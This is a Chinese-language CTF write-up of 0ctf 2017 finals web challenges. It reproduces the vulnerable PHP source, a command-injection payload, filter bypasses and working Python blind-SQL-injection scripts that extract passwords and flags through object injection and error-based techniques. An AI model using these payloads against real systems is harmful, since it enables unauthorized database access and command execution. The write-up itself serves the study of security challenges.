title: 0ctf2017 final
date: 2017-06-16 15:46:44
tags:
- ctf
- Blogs
- sqli
categories:
- Blogs
---

几周前刚刚从0ctf final的现场回来，虽然名词不好，但是收获很多，一直没来得及整理，今天终于整理完了...

<!--more-->
# AVATAR CENTER #

题目很简单，但是刚上手的时候挺萌比的，一共两个功能。

1、修改时区，登陆注册之后有一个修改时区的功能。（盲测讲道理是没什么卵用的）
2、上传头像，这里盲测的结果是没有不会做任何处理，包括文件名和内容，但是头像内容是通过函数返回的，访问getavatar，返回文件内容，没办法找到目录在哪。

研究了一会儿发现这题被秒的差不多了，感觉有忽略的条件，于是扫端口发现2121存在ftp服务，匿名登陆上了服务器，翻了翻拿到了源码。

分析下逻辑主要是这样的。

输入时区必须为6位
```
	if (strlen($tz) != 6) {
		$response->write("tz format error");
		return $response;		
	}
```

只要满足6位条件，那么就会传入
```
	public function setTZ($tz) {
		exec(sprintf("echo %s > %s%s/TZ", $tz, $this->profile_savepath, $this->getdir()));
	}
```

执行命令

但是还有个通用的防御函数
```
function Security()
{
	if (filter_shell($_GET))
			die("Potential Hack");

	if ($_SERVER['REQUEST_METHOD'] === "POST") {
		if (filter_shell($_POST))
			die("Potential Hack");
	}
}

function filter_shell($var)
{
	foreach($var as $key => $value) {
		if( is_array($value) && filter_shell($value))
			return true;
		if( preg_match("/[;$`&]/i", $key . $value))
			return true;
	}
	return false;
}
```

对字符做了部分过滤，虽然这里没必要绕过就可以，但的确是可以绕过的，因为这句`$_SERVER['REQUEST_METHOD'] === "POST"`因为这里是全等于，所以可以通过修改request_method的大小写来绕过，导致过滤无用。

 这里题目中给了提示，要用readflag命令读flag，那么这里的标准payload就是
 
 ```
 |*/re*
 ```
 
 由于当前目录刚好是根目录，所以6位刚好执行。
 
 这里也可以使用 escapeshellcmd 不过滤成对的引号的方法，通过sh执行命令，也就是小m的方法，就不赘述了。
 
 
# uglyweb #

说实话应该不是很难的题，但是放到线下花了很多时间，思路还是不太开阔。

整个站没什么功能，除了登陆注册以外，只有两个功能，一个是send，可以给指定的用户发送消息，收到消息的可以阅读（这里存在一个xss），另一个是reset，可以重置密码。

整个题目一共有两个flag，一个flag在数据库，另一个flag在cookie中，是httponly的，由于这是两个题目，所以仔细思考一下，可以猜到两个漏洞分别是什么。

数据库中的flag一定会有一个注入漏洞，而cookie中的flag，只有admin登陆才能看到，没办法通过任何别的方式获取，除非出题人失误，否则不能会出现一个洞打两个flag的情况，所以admin的密码一定不能解开，所以必须重置admin的密码。

回到代码逻辑上来，最重要的文件有几个：

```
user.class.php

<?php
class User{
	var $dbTable  = 'users';
	var $sessionVariable = 'userSessionValue';
	var $tbFields = array(
		'userID'=> 'userID', 
		'login' => 'username',
		'pass'  => 'password',
		'email' => 'email',
		'active'=> 'active'
	);
	
	var $displayErrors = false;
	var $userID;
	var $userData=array();

	var $remTime = 2592000;
	var $remCookieName = 'ckSavePass';
	var $remCookieDomain = '';

	function __construct() {
		global $mysqli;
		if( !isset( $_SESSION ) ) session_start();
		$this->dbConn = $mysqli;
		if ( !empty($_SESSION[$this->sessionVariable]) )
		{
			$this->loadUser( $_SESSION[$this->sessionVariable] );
		}
		if ( isset($_COOKIE[$this->remCookieName]) && !$this->is_loaded()){
			$u = unserialize(base64_decode($_COOKIE[$this->remCookieName]));
			$this->login($u['email'], $u['password']);
		}
	}

	function login($email, $password, $remember = false, $loadUser = true	{)

		$email	= $this->escape($email);
		$originalPassword = $password;
		$password = md5($password);
		$res = $this->query("SELECT * FROM `{$this->dbTable}` 
		WHERE `{$this->tbFields['email']}` = '$email' AND `{$this->tbFields['pass']}` = '$password' LIMIT 1",__LINE__);
		var_dump("SELECT * FROM `{$this->dbTable}` 
		WHERE `{$this->tbFields['email']}` = '$email' AND `{$this->tbFields['pass']}` = '$password' LIMIT 1");

		if ( $res->num_rows == 0)
			return false;
		if ( $loadUser )
		{
			$this->userData = $res->fetch_array();
			$this->userID = $this->userData[$this->tbFields['userID']];
			$_SESSION[$this->sessionVariable] = $this->userID;
		}
		if ( $remember ){
			$cookie = base64_encode(serialize(array('email'=>$email,'password'=>$originalPassword)));
			$a = setcookie($this->remCookieName, 
			$cookie,time()+$this->remTime, $base_path, $this->remCookieDomain, false, true);
		}
		return true;
	}

	function logout($redirectTo = '')
	{
		$_SESSION[$this->sessionVariable] = '';
		$this->userData = '';
		if ( $redirectTo != '' && !headers_sent()){
			header('Location: '.$redirectTo );
			exit;//To ensure security
		}
	}

	function is($prop){
		return $this->get_property($prop)==1?true:false;
	}

	function get_property($property)
	{
		if (empty($this->userID)) $this->error('No user is loaded', __LINE__);
		if (!isset($this->userData[$property])) $this->error('Unknown property <b>'.$property.'</b>', __LINE__);
		return $this->userData[$property];
	}

	function is_active()
	{
		return $this->userData[$this->tbFields['active']];
	}

	function is_loaded()
	{
		return empty($this->userID) ? false : true;
	}

	function activate()
	{
		if (empty($this->userID)) $this->error('No user is loaded', __LINE__);
		if ( $this->is_active()) $this->error('Allready active account', __LINE__);
		$res = $this->query("UPDATE `{$this->dbTable}` SET {$this->tbFields['active']} = 1 AND `activationHash`=''
		WHERE `{$this->tbFields['userID']}` = '".$this->escape($this->userID)."' LIMIT 1");
		if ($res->affected_rows == 1)
		{
			$this->userData[$this->tbFields['active']] = true;
			return true;
		}
		return false;
	}

	function insertUser($data){
		if (!is_array($data)) $this->error('Data is not an array', __LINE__);
		$data[$this->tbFields['pass']] = md5($data[$this->tbFields['pass']]);
		foreach ($data as $k => $v ) $data[$k] = "'".$this->escape($v)."'";
		$this->query("INSERT INTO `{$this->dbTable}` (`".implode('`, `', array_keys($data))."`) VALUES (".implode(", ", $data).")");
		return $this->dbConn->insert_id;
	}

	function randomPass($length=10, $chrs = '1234567890qwertyuiopasdfghjklzxcvbnm'){
		for($i = 0; $i < $length; $i++) {
			$pwd .= $chrs{mt_rand(0, strlen($chrs)-1)};
		}
		return $pwd;
	}

	function query($sql, $line = 'Uknown')
	{
		$res = $this->dbConn->query($sql);
		if ( !$res )
			$this->error($this->dbConn->error, $line);
		return $res;
	}

	function loadUser($userID)
	{
		$res = $this->query("SELECT * FROM `{$this->dbTable}` WHERE `{$this->tbFields['userID']}` = '".$this->escape($userID)."' LIMIT 1");
		if ( $res->num_rows == 0 )
			return false;
		$this->userData = $res->fetch_array();
		$this->userID = $userID;
		$_SESSION[$this->sessionVariable] = $this->userID;
		return true;
	}

	function findUser($username)
	{
		$res = $this->query("SELECT * FROM `{$this->dbTable}` WHERE `{$this->tbFields['login']}` = '".$this->escape($username)."' LIMIT 1");
		if ( $res->num_rows == 0 )
			return false;
		return $res->fetch_array()['userID'];
	}

	function escape($str)
	{
		if (is_array($str))
		{
			$str = array_map([&$this, 'escape'], $str);
			return $str;
		}
		else if (is_string($str))
		{
			return $this->dbConn->real_escape_string($str);
		}
		else if (is_bool($str))
		{
			return ($str === false) ? 0 : 1;
		}
		else if ($str === null)
		{
			return 'NULL';
		}
		return $str;
	}

	function error($error, $line = '', $die = false) {
		if ( $this->displayErrors )
			echo '<b>Error: </b>'.$error.'<br /><b>Line: </b>'.($line==''?'Unknown':$line).'<br />';
		if ($die) exit;
		return false;
	}
}
```


```
message.class.php

<?php
class Message{

	var $msg = "";
	var $from = "";
	var $to = "";
	var $id = -1;

	function __construct($from, $to, $msg, $id=-1) {
		global $mysqli;
		$this->from = $from;
		$this->to = $to;
		$this->msg = $msg;
		$this->id = $id;
	}

	function __toString(){
		return $this->msg;
	}

}

class MessageManager{
	function __construct() {
		global $mysqli;
		$this->dbConn = $mysqli;
	}

	function send($message){
		$sql = "INSERT INTO `message`(`from`, `to`, `msg`)VALUES('".$this->escape($message->from)."', '".$this->escape($message->to)."', '".$this->escape($message->msg)."')";
		$this->dbConn->query($sql);
		return $this->dbConn->insert_id;
	}

	function all($to){
		$sql = "SELECT * FROM `message` WHERE `read`=0 and `to`='".$this->escape($to)."'";
		$res = $this->dbConn->query($sql);
		$result = array();
		while($res && $message = $res->fetch_array()){
			$result[] = new Message($message['from'], $message['to'], $message['msg'], $message['id']);
		}
		return $result;

	}

	function one($to, $id){
		$sql = "SELECT * FROM `message` WHERE `read`=0 and `to`='".$this->escape($to)."' and `id`=".intval($id);
		$res = $this->dbConn->query($sql);
		$result = null;
		if($res && $message = $res->fetch_array()){
			$result = new Message($message['from'], $message['to'], $message['msg'], $message['id']);
		}
		return $result;

	}

	function read($id){
		$sql = "UPDATE `message` SET `read`=1 WHERE `id`=".intval($id);
		$res = $this->dbConn->query($sql);
	}

	function escape($str)
	{
		if (is_array($str))
		{
			$str = array_map([&$this, 'escape'], $str);
			return $str;
		}
		else if (is_string($str))
		{
			return $this->dbConn->real_escape_string($str);
		}
		else if (is_bool($str))
		{
			return ($str === false) ? 0 : 1;
		}
		else if ($str === null)
		{
			return 'NULL';
		}
		return $str;
	}

}
```

# ugly01 #

这里的第一个flag是通过sql注入得到的，其实通审所有源码，不难发现代码中所有进入数据库的语句全部通过了escape函数，我们来看看escape函数

```
function escape($str)
	{
		if (is_array($str))
		{
			$str = array_map([&$this, 'escape'], $str);
			return $str;
		}
		else if (is_string($str))
		{
			return $this->dbConn->real_escape_string($str);
		}
		else if (is_bool($str))
		{
			return ($str === false) ? 0 : 1;
		}
		else if ($str === null)
		{
			return 'NULL';
		}
		return $str;
	}
```

这里过滤了数组、字符串、布尔值、还判断了是不是null，那么没有被过滤的只有一种类型了，就是类。

那么我们回顾一下代码，在登陆逻辑中有个很重要的反序列化。

```
if ( isset($_COOKIE[$this->remCookieName]) && !$this->is_loaded()){
	$u = unserialize(base64_decode($_COOKIE[$this->remCookieName]));
	$this->login($u['email'], $u['password']);
}
```

这里的email会代入login函数中，拼接进入sql语句。

```
function login($email, $password, $remember = false, $loadUser = true	{)

		$email	= $this->escape($email);
		$originalPassword = $password;
		$password = md5($password);
		$res = $this->query("SELECT * FROM `{$this->dbTable}` 
		WHERE `{$this->tbFields['email']}` = '$email' AND `{$this->tbFields['pass']}` = '$password' LIMIT 1",__LINE__);
		var_dump("SELECT * FROM `{$this->dbTable}` 
		WHERE `{$this->tbFields['email']}` = '$email' AND `{$this->tbFields['pass']}` = '$password' LIMIT 1");

		if ( $res->num_rows == 0)
			return false;
		if ( $loadUser )
		{
			$this->userData = $res->fetch_array();
			$this->userID = $this->userData[$this->tbFields['userID']];
			$_SESSION[$this->sessionVariable] = $this->userID;
		}
		if ( $remember ){
			$cookie = base64_encode(serialize(array('email'=>$email,'password'=>$originalPassword)));
			$a = setcookie($this->remCookieName, 
			$cookie,time()+$this->remTime, $base_path, $this->remCookieDomain, false, true);
		}
		return true;
	}
```

只可惜这里也会进入escape函数，那么我就要想办法代入一个类才行，再看看代码

```
class Message{

	var $msg = "";
	var $from = "";
	var $to = "";
	var $id = -1;

	function __construct($from, $to, $msg, $id=-1) {
		global $mysqli;
		$this->from = $from;
		$this->to = $to;
		$this->msg = $msg;
		$this->id = $id;
	}

	function __toString(){
		return $this->msg;
	}

}
```

不难发现message中有一个tostring方法，那么思路就很清晰了。

通过设置cookie传入序列化的message类，message->tostring代入email，构成注入

```
<?php
  include 'message.class.php';
  $sql = new Message();
  // $sql->msg = 'ddog@ddog.c\' and (select substr(flag,1,1) from flag)=\'f\'#';\
  $sql->msg = 'ddog@123\' union select 1,"admin",1,1,1,1#';
  $payload = array(
    "email"=>$sql,
    "password"=>"23333"
  );
  echo base64_encode(serialize($payload));
?>

```

这是测试代码，附上exp

```
#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import base64

# url = "http://127.0.0.1/rsctf/uglyweb/"
url = "http://192.168.201.13/"

ll = "_{}*1234567890qwertyuiopasdfghjklzxcvbnm"
# a:2:{s:5:"email";O:7:"Message":4:{s:3:"msg";s:38:"ddog@ddog.c' union select 1,2,3,4,5,6#";s:4:"from";N;s:2:"to";N;s:2:"id";i:-1;}s:8:"password";s:5:"23333";}

payload = ""

def attack(url, payload):

	u1 = url + "send.php"

	plen = len(payload)

	payload = 'a:2:{s:5:"email";O:7:"Message":4:{s:3:"msg";s:'+str(plen)+':"'+payload+'";s:4:"from";N;s:2:"to";N;s:2:"id";i:-1;}s:8:"password";s:5:"23333";}'
	# print base64.b64encode(payload)

	cookies = {'ckSavePass': base64.b64encode(payload)}

	r = requests.get(u1, cookies=cookies)

	if 'Send Message' in r.text:
		return True

	return False

flag = ""

for i in xrange(40):
	for j in ll:
		payload = "bsw6b4y5@mail.bccto.me' and (select substr(PASSWORD,"+str(i)+",1) from users limit 1)='"+j+"'#"

		if attack(url, payload):
			flag +=j
			print flag
			break
```

这里的第二个flag根据出题人说的话，是通过php的mt_rand漏洞来预测随机数，重置admin的密码，get flag2.

但是这其中有一些问题，我们写一个demo
```
<?php

// mt_srand(3213214212);

function gencsrftoken($length=10, $chrs = '1234567890qwertyuiopasdfghjklzxcvbnm'){
	$csrf = '';
	for($i = 0; $i < $length; $i++) {
		$csrf .= $chrs{mt_rand(0, strlen($chrs)-1)};
	}
	return $csrf;
}

print gencsrftoken();

?>
```

获得token后，算出随机的数
```
s= "0gdfzw0lcz"
chr = "1234567890qwertyuiopasdfghjklzxcvbnm"


for i in s:
	# print i
	print str(chr.index(i))+" "+str(chr.index(i))+" 0 35",
```

然后使用计算随机数种子的工具
[http://www.openwall.com/php_mt_seed/README](http://www.openwall.com/php_mt_seed/README)

但是出了一些问题，如果我不指定随机数的种子，这个种子就不可被计算

```
lorexxar@icy:~/Documents/php_mt_rand_c$ ./php_mt_seed 22 22 0 35 31 31 0 35 19 19 0 35 23 23 0 35 33 33 0 35 20 20 0 35 27 27 0 35 4 4 0 35 31 31 0 35 3 3 0 35
Pattern: EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36
Found 0, trying 33554432 - 67108863, speed 15606712 seeds per second ^C
lorexxar@icy:~/Documents/php_mt_rand_c$ ./php_mt_seed 9 9 0 35 16 16 0 35 19 19 0 35 12 12 0 35 11 11 0 35 16 16 0 35 20 20 0 35 13 13 0 35 5 5 0 35 20 20 0 35
Pattern: EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36
Found 0, trying 4261412864 - 4294967295, speed 20581564 seeds per second 
Found 0
lorexxar@icy:~/Documents/php_mt_rand_c$ ./php_mt_seed 9 9 0 35 24 24 0 35 22 22 0 35 23 23 0 35 29 29 0 35 11 11 0 35 9 9 0 35 28 28 0 35 31 31 0 35 29 29 0 35
Pattern: EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36 EXACT-FROM-36
Found 0, trying 4261412864 - 4294967295, speed 20432551 seeds per second 
Found 0
```

只有在被指定的情况下，才能跑出种子....出题的大佬说他没测试过题目...

# luckygame #

题很难，而且完成的要求非常苛刻，这里一步步的解决。

首先是源码
```
<?php session_start(); ?>
<!DOCTYPE html>
<html>
<head>
    <title>Lucky Game</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:200">
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.2/build/pure-min.css" integrity="sha384-UQiGfs9ICog+LwheBSRCt1o5cbyKIHbwjWscjemyBMT9YCUMZffs6UqUTd0hObXD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://purecss.io/combo/1.18.13?/css/main-grid.css&amp;/css/main.css&amp;/css/menus.css&amp;/css/rainbow/baby-blue.css">
    <style>
    .header{font-family: 'Noto Sans', sans-serif;}
    .header h1{color: rgb(202, 60, 60);}
    .button-error {background: rgb(202, 60, 60);}
    .button-success {background: rgb(28, 184, 65);}
    </style>
</head>
<body>
<div id="layout">
<div id="menu">
    <div class="pure-menu">
        <a class="pure-menu-heading" href="#">TCTF</a>
    </div>
</div>
<div id="main">
    <div class="header">
        <h1>幸运数字</h1>
        <h2>Shall we play a "lucky" game?</h2>
    </div>
<div class="content">
<?php

ini_set("display_errors", "On");
error_reporting(E_ALL | E_STRICT);

// require 'config.php';
if (!$link=mysqli_connect('localhost', 'root', '')) die('Connection error');
if (!mysqli_select_db($link,'luckygame')) die('Database error');

$tbls = "SELECT group_concat(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()";
$cols = "SELECT group_concat(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_schema=database()";
$query = mysqli_query($link,$tbls,MYSQLI_USE_RESULT);
$tbls_name = mysqli_fetch_array($query)[0];
mysqli_free_result($query);
$query = mysqli_query($link,$cols,MYSQLI_USE_RESULT);
$cols_name = mysqli_fetch_array($query)[0];
mysqli_free_result($query);


# CREATE TABLE users(id int NOT NULL AUTO_INCREMENT,username varchar(24),password varchar(32),points int,UNIQUE KEY(username),PRIMARY KEY(id));
# INSERT INTO users VALUES(1,"admin",md5(password_of_admin),10);
# CREATE TABLE logs(id int NOT NULL,log varchar(64));


foreach($_POST as $k => $v){
    if(!empty($v) && is_string($v))
        $_POST[$k] = trim(mysqli_escape_string($link,$v));
    else
        unset($_POST[$k]);
}

foreach($_GET as $k => $v){
    if(!empty($v) && is_string($v))
        $_GET[$k] = trim(mysqli_escape_string($link,$v));
    else
        unset($_GET[$k]);
}


function filter($s){
    global $tbls_name,$cols_name;
    $blacklist = "sleep|benchmark|order|limit|exp|extract|xml|floor|rand|count|".$tbls_name.'|'.$cols_name; # Ninjas need nothing
    if(preg_match("/{$blacklist}/is",$s,$a)) die($blacklist."\n".$a[0]."\n".$s."\n"."<aside>0ops!</aside>");
    return $s;
}

function register($username,$password){
    global $link;
    $q = sprintf("INSERT INTO users VALUES (NULL,'%s',md5('%s'),10)",
        filter($username),filter($password));

    if(!$query = mysqli_query($link,$q,MYSQLI_USE_RESULT)) return FALSE;
    return TRUE;
}

function login($username,$password){
    global $link;
    $q = sprintf("SELECT * FROM users WHERE username = '%s' AND password = md5('%s')",
        filter($username),filter($password));
    if(!$query = mysqli_query($link,$q,MYSQLI_USE_RESULT)) return FALSE;
    $result = mysqli_fetch_array($query);
    mysqli_free_result($query);
    if(count($result)>0){
        $_SESSION['id'] = $result['id'];
        $_SESSION['user'] = $result['username'];
        return TRUE;
    } else {
        unset($_SESSION['id'],$_SESSION['user']);
        return FALSE;
    }
}

function user_log($s){
    global $link;
    $q = sprintf("INSERT INTO logs VALUES (id+1,'%s')",
        filter($_SESSION['id'].'|'.$s));
    if(!$query = mysqli_query($link,$q)) return FALSE;
    return TRUE;
}

function update_point($p){
    global $link;
    $q = sprintf("UPDATE users SET points=points+%d WHERE id = %d",
        $p,$_SESSION['id']);
    if(!$query = mysqli_query($link,$q)) return FALSE;
    if(!user_log("Update ".$p)) return FALSE;
    return TRUE;
}

function my_point(){
    global $link;
    $q = sprintf("SELECT * FROM users WHERE username = '%s'",
        filter($_SESSION['user']));
    if(!$query = mysqli_query($link,$q,MYSQLI_USE_RESULT)) return FALSE;
    $result = mysqli_fetch_array($query);
    mysqli_free_result($query);
    return (int)($result['points']);
}

switch(@$_GET['action']){
    case 'register':
        if(!empty($_POST['user']) && !empty($_POST['pass']))
            if(!register($_POST['user'],$_POST['pass']))
                die("<aside>Something went wrong!</aside>");
        break;
    case 'login':
        if(!empty($_POST['user']) && !empty($_POST['pass']))
            login($_POST['user'],$_POST['pass']);
        break;
    case 'logout':
        unset($_SESSION['user'],$_SESSION['id']);
        break;
    default:
        break;
}

if(empty($_SESSION['user'])){
    echo <<<EOF
        <form action="?action=register" method=POST class="pure-form pure-form-stacked">
            <fieldset>
                <input type=text name=user required placeholder="Username" />
                <input type=password name=pass required placeholder="Password" />
                <button type="submit" class="pure-button pure-button-primary">Register</button>
            </fieldset>
        </form>

        <form action="?action=login" method=POST class="pure-form pure-form-stacked">
            <fieldset>
                <input type=text name=user required placeholder="Username"  />
                <input type=password name=pass required placeholder="Password" />
                <button type="submit" class="pure-button pure-button-primary button-success">Login</button>
            </fieldset>
        </form>
EOF;
    die();
}

$points = my_point();

if($points == 1337){
    user_log('winner');
    echo "<h3>Well played, we will give you a reward soon.</h3>";
}

echo <<<EOF
    <h1>Hello <a href='?action=logout'>{$_SESSION['user']}</a></h1>
    <h2>You got {$points} points</h2>
    <form method=GET class="grid-panel pure-form-aligned pure-form">
                    <div class="bet-control pure-control-group">
                        <label for="bet-input">
                            Your bet
                        </label>
                        <input name="bet" id="bet-input" data-content="bet-input"
                               type="number" min="0" max="16" value=1>

                    </div>

                    <div class="guess-control pure-control-group">
                        <label for="guess-input">
                            Your guess
                        </label>
                        <input name="guess" id="guess-input" data-content='guess-input'
                               type="number" min="0" value=1>
                    </div>
        <button type="submit" class="pure-button pure-button-primary button-error">Place</button>
    </form>

EOF;

if(!empty($_REQUEST['bet']) && (int)$_REQUEST['bet'] > 0 && !empty($_REQUEST['guess']) && (int)$_REQUEST['guess'] > 0){
    echo "<aside>";
    if($_REQUEST['bet'] > $points) die("What?! you're cheater!");
    $number = rand()%8;
    echo "It is...<h1 style='color:#fff'>".$number."</h2><br />";
    if( $number == $_REQUEST['guess'] ){
        echo "You won!";
        if(!update_point($_REQUEST['bet']))
            return;
    } else {
        echo "You lost :(";
        if(!update_point(-$_REQUEST['bet']))
            return;
    }
    echo "</aside>";
}

mysqli_close($link);
?>

</div>
</div>
</div>
</body>
</html>


```

先顺序看一遍，很容易发现在注册然后登陆，在获取my_point的时候。

```
function my_point(){
    global $link;
    var_dump("SELECT * FROM users WHERE username = '".filter($_SESSION['user'])."'" );
    $q = sprintf("SELECT * FROM users WHERE username = '%s'",
        filter($_SESSION['user']));
    if(!$query = mysqli_query($link,$q,MYSQLI_USE_RESULT)) return FALSE;
    $result = mysqli_fetch_array($query);
    mysqli_free_result($query);
    return (int)($result['points']);
}
```

这里从session中获取了user的值，构成了一个二次注入，但是这里有个新的问题，因为题目当中给了数据库结构，我们来看看
```

# CREATE TABLE users(id int NOT NULL AUTO_INCREMENT,username varchar(24),password varchar(32),points int,UNIQUE KEY(username),PRIMARY KEY(id));
# INSERT INTO users VALUES(1,"admin",md5(password_of_admin),10);
# CREATE TABLE logs(id int NOT NULL,log varchar(64));
```

user这里只有24位，这也是核心问题所在，我们没办法通过任何方式注入数据。所以我们必须想别的办法。

很快我们都能找到第二个注入在`user_log`中,通过更新分数然后进入`user_log`，这里有一个insert注入。

```
function user_log($s){
    global $link;
    $q = sprintf("INSERT INTO logs VALUES (id+1,'%s')",
        filter($_SESSION['id'].'|'.$s));
    var_dump($q);
    if(!$query = mysqli_query($link,$q)) return FALSE;
    return TRUE;
}

function update_point($p){
    global $link;
    $q = sprintf("UPDATE users SET points=points+%d WHERE id = %d",
        $p,$_SESSION['id']);
    if(!$query = mysqli_query($link,$q)) return FALSE;
    if(!user_log("Update ".$p)) return FALSE;
    var_dump("Ture");
    return TRUE;
}

```

这下我们有两个注入点了，但是我们遇到了新的问题，如果绕过filter的判断
```
function filter($s){
    global $tbls_name,$cols_name;
    $blacklist = "sleep|benchmark|order|limit|exp|extract|xml|floor|rand|count|".$tbls_name.'|'.$cols_name; # Ninjas need nothing
    if(preg_match("/{$blacklist}/is",$s,$a)) die($blacklist."\n".$a[0]."\n".$s."\n"."<aside>0ops!</aside>");
    return $s;
}
```

这里的主要问题是，如何绕过对表名和列名的判断。

这里用一个黑科技，既然我们可以把admin的密码通过注入来select出来，那么问题就是如何获取这个结果，这里可以使用mysql中的变量。

```
SELECT * FROM `users` WHERE username = "admin" into @a,@b,@c,@d;
INSERT INTO logs VALUES (id+1,'17|Update 1e-1000' in (concat('123',1/(substr(@c,1,1)='d'))))
```

通过构造双语句，构造报错盲注，我们再来看看代码
```
if(xx){
        echo "You won!";
        if(!update_point($_REQUEST['bet']))
            return;
    } else {
        echo "You lost :(";
        if(!update_point(-$_REQUEST['bet']))
            return;
    }
    echo "</aside>";

```
如果我们构造除0错误，导致insert报错，这样这里就会直接return，如果正常就能输出`</aside>`，这样就构成了盲注。

这里使用的还是mysql的长连接特性，这样才能保证`@c`在注入的时候仍然存在。

这里我们构造username为
```
admin' into @a,@b,@c,@d#
```

然后构造bet为
```
1e-1000' in (concat('123',1/(substr("test",1,1)='d'))))#
```

最后一个坑是php的坑，由于我们在获取my_point的时候遇到了一些问题，因为题目中有个判断。

```
(int)$_REQUEST['bet'] > 0 

if($_REQUEST['bet'] > $points) die("What?! you're cheater!");
```

要满足这个条件，我们需要一些黑科技。

```
<?php
$a=1e-10;
var_dump((int)$a);

var_dump($a>0);
?>
```

当a为1e-10的时候，php的返回是这样的
```
D:\wamp64\www\test.php:3:int 0

D:\wamp64\www\test.php:5:boolean true
```

当a为1e-1000的时候，php的返回是这样的
```
D:\wamp64\www\test.php:3:int 0

D:\wamp64\www\test.php:5:boolean false
```

这样我们就可以构造出来一个既大于0，又不大于0的值，完成注入。

这里脚本用了小m的
```
# -*- coding: utf-8 -*-
import hashlib
from string import ascii_letters, digits
import requests
import re

url = 'http://127.0.0.1/rsctf/luckygame/'
header = {'cookie': 'PHPSESSID=jja6dabqrsgl8r43t6md3n1o14'}
flag = ''
exit_flag = False
for i in range(1, 33):
    for j in ascii_letters + digits:
        payload = "1e-1000' in (concat('123',1/(substr(@c,%d,1)='%s'))))#" % (i, j)
        while True:
            print payload
            res = requests.post(url, data={'guess':'1', 'bet':payload}, headers=header).text
            # print res
            # raw_input()
            if ('won' in res) and ('</aside>' in res):
                exit_flag = True
                print i
                flag += j
                print flag
                break;
            elif ('won' in res):
                break
            else:
                continue
        if exit_flag:
            exit_flag = False
            break;
```
